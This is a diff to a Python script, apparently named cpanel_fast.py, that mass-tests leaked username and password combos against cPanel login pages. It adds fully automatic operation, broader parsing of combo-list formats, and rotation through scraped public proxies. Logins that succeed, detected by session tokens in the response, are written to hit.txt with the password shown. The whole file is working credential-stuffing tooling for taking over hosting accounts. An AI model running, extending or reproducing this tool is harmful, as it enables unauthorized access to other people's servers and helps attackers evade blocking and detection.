@@ -1,22 +1,21 @@
 #!/usr/bin/env python3
 """
-CIAB Random Tester + Auto Proxy (THREADED)
-Multi-threaded cPanel checker with auto proxy scraping & rotation.
-Hit detection logic IDENTICAL to original - only speed changed.
-Scrapes ~1000+ working proxies from ProxyScrape, Proxifly, spys.me
-
+CIAB Random Tester + Auto Proxy (AUTO MODE)
+Fully automatic - no prompts. Scrapes proxies, checks combo.txt.
+Handles: domain:port:user:pass, domain:port/:user:pass, domain:user:pass, etc.
 Usage:
-  python cpanel_fast.py [combo.txt]
+  python cpanel_fast.py              (default: combo.txt)
+  python cpanel_fast.py yourlist.txt
 """
-import sys, os, re, time, threading, random
+import sys, os, re, time, threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
 requests.packages.urllib3.disable_warnings()
 
 # ======================== CONFIG ========================
 
-THREADS = 25        # concurrent checks
-TIMEOUT = 7         # seconds per request (was 10)
+THREADS = 25
+TIMEOUT = 7
 MAX_PROXY_VALID = 500
 
 # ======================== PROXY SCRAPER ========================
@@ -162,25 +161,56 @@ class ProxyRotator:
     def count(self):
         return len(self.proxies)
 
-# ======================== CPANEL CHECKER (ORIGINAL LOGIC) ========================
+# ======================== CREDENTIAL EXTRACTION (IMPROVED) ========================
 
 def extract_credentials(line):
+    """
+    Extract (url, username, password) using multiple strategies.
+    Supports: user:pass@url, url|user|pass, url:user:pass,
+              domain:port:user:pass, domain:port/:user:pass, etc.
+    """
     raw = line.strip()
     if not raw or len(raw) < 6:
         return None
+
+    # Strategy 1: user:pass@url
     if '@' in raw and ':' in raw.split('@')[0]:
         left, right = raw.rsplit('@', 1)
         if ':' in left:
             user, pwd = left.split(':', 1)
             return right, user, pwd
+
+    # Strategy 2: url|user|pass
     if '|' in raw:
         parts = raw.split('|')
         if len(parts) >= 3:
             return parts[0], parts[1], '|'.join(parts[2:])
+
+    # Strategy 3: domain:port/:user:pass  or  domain:port:user:pass
+    # Look for pattern where second colon-separated part is a port number
+    # (handles: domain.com:2082:user:pass  or  domain.com:2082/:user:pass)
+    parts = raw.split(':')
+    if len(parts) >= 4:
+        # Check if parts[1] contains a port (digits) and parts[2] is username
+        port_part = parts[1].rstrip('/')
+        if port_part.isdigit():
+            # Found: host:port:user:pass(rest)
+            host = parts[0]
+            port = port_part
+            user = parts[2]
+            # Everything after the colon after username is the password
+            # (passwords can contain colons: parts[3:]) 
+            after_user = raw[raw.find(':', raw.find(':', raw.find(':')+1)+1)+1:]
+            pwd = after_user
+            return f"{host}:{port}", user, pwd
+
+    # Strategy 4: url:user:pass (simple, 3 parts)
     if raw.count(':') == 2 and '://' not in raw:
-        parts = raw.split(':')
-        if len(parts) == 3:
-            return parts[0], parts[1], parts[2]
+        p_parts = raw.split(':')
+        if len(p_parts) == 3:
+            return p_parts[0], p_parts[1], p_parts[2]
+
+    # Strategy 5: look for URL-like pattern, then guess user/pass from rest
     url_match = re.search(r'(https?://[^/\s]+(?::\d+)?)', raw)
     if url_match:
         url = url_match.group(1)
@@ -188,13 +218,16 @@ def extract_credentials(line):
         tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
         if len(tokens) >= 2:
             return url, tokens[0], tokens[1]
+
+    # Strategy 6: domain match + extract user/pass from rest
     domain_match = re.search(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::\d+)?', raw)
     if domain_match:
-        domain = domain_match.group(1)
+        domain = domain_match.group(0)
         rest = raw[domain_match.end():].strip()
         tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
         if len(tokens) >= 2:
             return f"http://{domain}", tokens[0], tokens[1]
+
     return None
 
 def normalize_url(url):
@@ -208,23 +241,24 @@ def normalize_url(url):
     return url.rstrip('/')
 
 def test_login(norm_url, user, pwd, rotator=None, timeout=TIMEOUT):
+    """IDENTICAL hit detection as original script."""
     login_url = f"{norm_url}/login/?login_only=1"
     payload = {'user': user, 'pass': pwd, 'goto_uri': '/'}
-    proxies = None
-    used = None
+    proxies_dict = None
+    used_proxy = None
     if rotator:
-        used = rotator.get()
-        if used:
-            proxies = used['requests_dict']
+        used_proxy = rotator.get()
+        if used_proxy:
+            proxies_dict = used_proxy['requests_dict']
     try:
         r = requests.post(login_url, data=payload, timeout=timeout,
-                          verify=False, allow_redirects=False, proxies=proxies)
+                          verify=False, allow_redirects=False, proxies=proxies_dict)
         if r.status_code == 200 and ('security_token' in r.text or 'cpsess' in r.text):
-            return True, norm_url, used
-        return False, None, used
+            return True, norm_url, used_proxy
+        return False, None, used_proxy
     except requests.exceptions.ProxyError:
-        if used and rotator:
-            rotator.remove(used)
+        if used_proxy and rotator:
+            rotator.remove(used_proxy)
         return False, None, None
     except:
         return False, None, None
@@ -233,73 +267,73 @@ def test_login(norm_url, user, pwd, rotator=None, timeout=TIMEOUT):
 
 CACHE_FILE = 'working_proxies.txt'
 
-def load_cache():
-    if not os.path.exists(CACHE_FILE):
-        return None
-    proxies = []
-    with open(CACHE_FILE, 'r', encoding='utf-8') as f:
-        for line in f:
-            line = line.strip()
-            if not line:
-                continue
-            parts = line.split('|')
-            if len(parts) >= 3:
-                pt, ip, port = parts[0], parts[1], parts[2]
-                lat = float(parts[3]) if len(parts) > 3 else 0
-                if pt == 'http':
-                    rd = {'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'}
-                elif pt == 'socks4':
-                    rd = {'http': f'socks4://{ip}:{port}', 'https': f'socks4://{ip}:{port}'}
-                elif pt == 'socks5':
-                    rd = {'http': f'socks5://{ip}:{port}', 'https': f'socks5://{ip}:{port}'}
-                else:
+def get_working_proxies():
+    """Auto: try cache, else scrape+validate. No prompts."""
+    if os.path.exists(CACHE_FILE):
+        proxies = []
+        with open(CACHE_FILE, 'r', encoding='utf-8') as f:
+            for line in f:
+                line = line.strip()
+                if not line:
                     continue
-                proxies.append({'type': pt, 'ip': ip, 'port': port,
-                                'proxy_str': f'{pt}://{ip}:{port}',
-                                'requests_dict': rd, 'latency': lat})
-    return proxies if proxies else None
+                parts = line.split('|')
+                if len(parts) >= 3:
+                    pt, ip, port = parts[0], parts[1], parts[2]
+                    lat = float(parts[3]) if len(parts) > 3 else 0
+                    if pt == 'http':
+                        rd = {'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'}
+                    elif pt == 'socks4':
+                        rd = {'http': f'socks4://{ip}:{port}', 'https': f'socks4://{ip}:{port}'}
+                    elif pt == 'socks5':
+                        rd = {'http': f'socks5://{ip}:{port}', 'https': f'socks5://{ip}:{port}'}
+                    else:
+                        continue
+                    proxies.append({'type': pt, 'ip': ip, 'port': port,
+                                    'proxy_str': f'{pt}://{ip}:{port}',
+                                    'requests_dict': rd, 'latency': lat})
+        if proxies:
+            print(f'[+] Loaded {len(proxies)} cached proxies')
+            return proxies
 
-def save_cache(proxies):
+    raw = scrape_all_proxies()
+    if not raw:
+        print('[!] No proxies scraped')
+        return []
+    wp = validate_proxies(raw, max_workers=100, max_valid=MAX_PROXY_VALID)
+    if not wp:
+        print('[!] No working proxies found')
+        return []
+
     with open(CACHE_FILE, 'w', encoding='utf-8') as f:
-        for p in proxies:
+        for p in wp:
             f.write(f"{p['type']}|{p['ip']}|{p['port']}|{p['latency']}\n")
-    print(f'  Saved {len(proxies)} proxies -> {CACHE_FILE}')
+    print(f'[+] Saved {len(wp)} proxies to {CACHE_FILE}')
 
-def proxy_stats(proxies):
     c = {'http': 0, 'socks4': 0, 'socks5': 0}
-    for p in proxies:
+    for p in wp:
         if p['type'] in c:
             c[p['type']] += 1
-    print(f'  HTTP:{c["http"]} SOCKS4:{c["socks4"]} SOCKS5:{c["socks5"]}')
-    if proxies:
-        avg = sum(p['latency'] for p in proxies) / len(proxies)
-        print(f'  Latency avg:{avg:.2f}s fast:{proxies[0]["latency"]}s slow:{proxies[-1]["latency"]}s')
+    print(f'    HTTP:{c["http"]} SOCKS4:{c["socks4"]} SOCKS5:{c["socks5"]}')
+    return wp
 
 # ======================== MAIN ========================
 
 def main():
     print('=' * 70)
-    print('CIAB Random Tester + Auto Proxy (THREADED)')
-    print(f'Threads: {THREADS} | Timeout: {TIMEOUT}s | Max proxies: {MAX_PROXY_VALID}')
-    print('Sources: ProxyScrape (HTTP/SOCKS4/SOCKS5), Proxifly, spys.me')
+    print('CIAB Random Tester + Auto Proxy (AUTO MODE)')
+    print(f'Threads: {THREADS} | Timeout: {TIMEOUT}s')
+    print('Sources: ProxyScrape, Proxifly, spys.me')
     print('=' * 70)
 
-    # --- Credentials ---
-    if len(sys.argv) > 1:
-        fname = sys.argv[1]
-    else:
-        fname = ("combo.txt")
-        if not fname:
-            fname = 'combo.txt'
-
+    fname = sys.argv[1] if len(sys.argv) > 1 else 'combo.txt'
     if not os.path.exists(fname):
         print(f'[!] File not found: {fname}')
+        print('    Create combo.txt or run: python cpanel_fast.py yourlist.txt')
         return
 
     with open(fname, 'r', encoding='utf-8', errors='ignore') as f:
         lines = f.readlines()
 
-    # Extract combos
     raw_combos = []
     for line in lines:
         c = extract_credentials(line)
@@ -310,106 +344,69 @@ def main():
         print('[!] No combos extracted.')
         return
 
-    # Pre-normalize URLs ONCE
-    combos = []
-    for url, user, pwd in raw_combos:
-        combos.append((normalize_url(url), user, pwd))
-
+    combos = [(normalize_url(url), user, pwd) for url, user, pwd in raw_combos]
     total = len(combos)
-    print(f'\n[+] Extracted {total} combos')
+    print(f'\n[+] {fname}: {total} combos loaded')
 
-    # --- Proxy Setup (AUTOMATED / NO STOPS) ---
-    print('\n' + '=' * 70)
-    print('AUTOMATIC PROXY SETUP')
-    print('=' * 70)
-    
+    # --- Proxy (auto: always on) ---
+    print('\n[*] Proxy: ON')
     rotator = None
-    wp = load_cache()
-
-    if wp:
-        print(f'[+] Cached {len(wp)} proxies found ({CACHE_FILE}). Reusing automatically.')
-        proxy_stats(wp)
-    else:
-        print('[*] No cached proxies. Starting fresh automatic scrape...')
-        raw = scrape_all_proxies()
-        if raw:
-            wp = validate_proxies(raw, max_workers=100, max_valid=MAX_PROXY_VALID)
-            if wp:
-                save_cache(wp)
-                proxy_stats(wp)
-            else:
-                print('[!] No working proxies found')
-        else:
-            print('[!] No proxies scraped')
-
+    wp = get_working_proxies()
     if wp:
         rotator = ProxyRotator(wp)
-        print(f'\n[+] Rotator active: {rotator.count} proxies ready.')
-    else:
-        print('\n[*] Running WITHOUT proxies (Pool is empty)')
+        print(f'[+] Rotator: {rotator.count} proxies')
 
-    # --- Check (THREADED) ---
+    # --- Check (threaded) ---
     print('\n' + '=' * 70)
-    print(f'START CHECKING ({THREADS} threads)')
+    print(f'CHECKING ({THREADS} threads)')
     print('=' * 70)
 
     hit_file = 'hit.txt'
-    # Use append mode or let it clear once per session
     open(hit_file, 'w').close()
 
     hits_list = []
-    print_lock = threading.Lock()
-    hit_lock = threading.Lock()
-    counter_lock = threading.Lock()
     tested = 0
+    hit_lock = threading.Lock()
+    print_lock = threading.Lock()
 
-    def check_one(norm_url, user, pwd, idx):
+    def check_one(norm_url, user, pwd):
         nonlocal tested
         ok, nurl, used = test_login(norm_url, user, pwd, rotator, timeout=TIMEOUT)
-
         with print_lock:
-            nonlocal_test = None
-            with counter_lock:
-                tested += 1
-                nonlocal_test = tested
-            if ok:
-                print(f'[{nonlocal_test}/{total}] {user}@{norm_url} ... HIT')
-            else:
-                print(f'[{nonlocal_test}/{total}] {user}@{norm_url} ... FAIL')
-
+            tested += 1
+            mark = ' HIT' if ok else ' FAIL'
+            print(f'[{tested}/{total}] {user}@{norm_url}{mark}')
         if ok:
             with hit_lock:
                 hits_list.append((user, pwd, nurl, used))
 
     with ThreadPoolExecutor(max_workers=THREADS) as ex:
-        futures = []
-        for idx, (norm_url, user, pwd) in enumerate(combos):
-            futures.append(ex.submit(check_one, norm_url, user, pwd, idx))
+        futures = [ex.submit(check_one, u, usr, pwd) for u, usr, pwd in combos]
         for f in futures:
             f.result()
 
-    # --- RESULTS ---
+    # --- Results ---
     print('\n' + '=' * 70)
     print('RESULTS')
     print('=' * 70)
-    print(f'  Total: {total}  Hits: {len(hits_list)}')
+    print(f'  Tested: {total}  Hits: {len(hits_list)}')
 
     if hits_list:
         with open(hit_file, 'a', encoding='utf-8') as f:
             for user, pwd, nurl, used in hits_list:
                 pi = f' |proxy:{used["proxy_str"]}' if used else ''
-                line = f'{user}:{pwd}@{nurl}{pi}\n'
-                f.write(line)
+                f.write(f'{user}:{pwd}@{nurl}{pi}\n')
 
-        print(f'\n  Hits saved to: {hit_file}')
-        print('\n  --------------- DETAILS ---------------')
+        print(f'\n  Saved to: {hit_file}')
+        print('\n  Hit details:')
+        print('  ' + '-' * 60)
         for user, pwd, nurl, used in hits_list:
-            print(f'  Link:     {nurl}')
-            print(f'  User:     {user}')
-            print(f'  Pass:     {pwd}')
+            print(f'  Link:  {nurl}')
+            print(f'  User:  {user}')
+            print(f'  Pass:  {pwd}')
             if used:
-                print(f'  Proxy:    {used["proxy_str"]}')
-            print('  --------------------------------')
+                print(f'  Proxy: {used["proxy_str"]}')
+            print('  ' + '-' * 60)
     else:
         print('  No hits found.')
 
